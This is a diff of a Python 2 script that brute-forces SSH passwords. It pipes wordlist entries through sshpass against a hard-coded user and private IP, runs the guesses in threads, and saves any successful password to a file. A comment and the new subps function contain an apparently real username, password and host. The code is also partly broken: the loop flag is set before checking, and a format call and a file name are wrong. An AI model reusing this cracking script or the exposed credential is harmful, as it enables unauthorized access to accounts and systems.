@@ -3,9 +3,11 @@
 # coding=utf-8
 # 32-126 : 20-7E
 # Queue: https://www.troyfawkes.com/learn-python-multithreading-queues-basics/
-import thread
+import subprocess
 import threading
 import commands
+import time
+from subprocess import PIPE, Popen
 
 p = 1
 USERNAME = "chrisb14"
@@ -14,6 +16,7 @@ PORT = "22"
 new_results = []
 correct_pw = ""
 cracked = bool(False)
+filenr = 1
 counter = 0
 # sshpass -p bkdrugis ssh Sigurdkb@10.225.147.156 -p 2222
 
@@ -23,17 +26,18 @@ def connect_ssh():
 
         while cracked == False:
             pw = get_next_pw()
-            result = commands.getoutput("sshpass -p " +  pw + " ssh "+ USERNAME + "@" + IP_ADRESS + " -p " + PORT)
+            cracked = True
+            result = commands.getoutput("sshpass -p " + pw + " ssh " + USERNAME + "@" + IP_ADRESS + " -p " + PORT)
 
-            if result.__contains__("Permission denied"):
+            if str(result).__contains__("Permission denied"):
                 print "Password try: " + pw
             elif result.__contains__("Welcome") & result.__contains__("Ubuntu"):
                 print "Correct password: " + pw
                 correct_pw = pw
                 f = open("correct_pw.txt", 'w')
                 f.write(correct_pw)
-                thread.interrupt_main()
                 cracked = True
+                exit(0)
 
             else:
                 print "Passord som gav nytt resultat: " + pw
@@ -47,10 +51,12 @@ def connect_ssh():
 
 def get_next_pw():
     global counter
-
+    global counter_loop
     f = open("wordlist.txt", "r")
+
     line = f.readlines()[counter]
     counter += 1
+
     return line.strip('\n')
 
 
@@ -58,27 +64,42 @@ def main():
 
     t1 = threading.Thread(target=connect_ssh)
     t2 = threading.Thread(target=connect_ssh)
-    t3 = threading.Thread(target=connect_ssh)
-    t4 = threading.Thread(target=connect_ssh)
-    t5 = threading.Thread(target=connect_ssh)
-    t6 = threading.Thread(target=connect_ssh)
 
     t1.start()
     t2.start()
-    t3.start()
-    t4.start()
-    t5.start()
-    t6.start()
 
     t1.join()
     t2.join()
-    t3.join()
-    t4.join()
-    t5.join()
-    t6.join()
+
+
+
+def subps():
+    pw = get_next_pw()
+    cmd = 'sshpass -p bkdrugis ssh Sigurdkb@10.225.147.156 -p 2222'.format(pw)
+
+    output, err = Popen(cmd.split(), stdout=PIPE, stderr=PIPE).communicate()
+    print "Output" + output, err
+
+    if not b"Permission denied, please try again." in output:
+        print "Det gikk: " + pw
+
+    else:
+        print "Feil passord: " + pw
+
+def split_file():
+    global counter
+    global filenr
+
+    f = open("worlist_part"+str(filenr)+".txt", 'r')
+    l = f.readlines()[counter]
+    if l == '':
+        print ("wordlist_part"+ str(filenr) + " er ferdig")
+        filenr += 1
+        split_file()
+    else:
+        counter += 1
+        return l.strip('\n')
 
 
 main()
-
-
 
